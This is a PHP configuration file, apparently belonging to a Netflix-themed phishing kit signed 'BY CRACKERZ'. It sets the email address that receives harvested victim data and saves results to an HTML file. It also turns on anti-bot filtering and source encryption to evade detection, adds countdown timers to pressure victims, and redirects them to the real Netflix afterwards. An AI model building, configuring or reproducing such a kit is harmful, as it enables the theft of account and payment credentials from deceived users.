<?php


/* Programmer name :

		╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
		╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
		╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

 		      #2018  Mailer-inbox-unlimited.gq  */


# you can add more receiver by [,]
$mail = "your-email@yahoo.com";	

# Administrator login
$admin_user = 'BadPixel';

# Administrator password
$admin_pass = 'p4ssword';			

# save result in file 1 or 0
$save_result = 1;

# Result file name (.html)*
$file_result = "results.htm";

# name file visits
$file_stats = 'stats.htm';

# enable recaptcha
$enable_captcha = 1;

# key for recapcha* 
$key_captcha = '6LfGWmIUAAAAAC8xrhHGT8vUOVVYYP1xKMMXw-U0';
// https://www.google.com/recaptcha/intro/v3beta.html

# /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\  ADVANCED*

# anti bots 1 or 0
$anti_bot = 1;

# crypt source page 1 or 0
$crypt_mode = 1;

# require login 1 or 0
$required_login = 1;

# auto rediretc counter first page (in seconds)*
$auto_redirect_info = 30;

# count down first visit (in minutes)*
$count_down_first_time = 8; 

# count down last chance (in minutes)*
$count_down_last_chance = 10;

# auto redirect to netflix (in seconds)*
$auto_redirect_netflix = 30;

# session destroy after thanks 1 or 0
$destroy_session = 1;


?>                                               																											



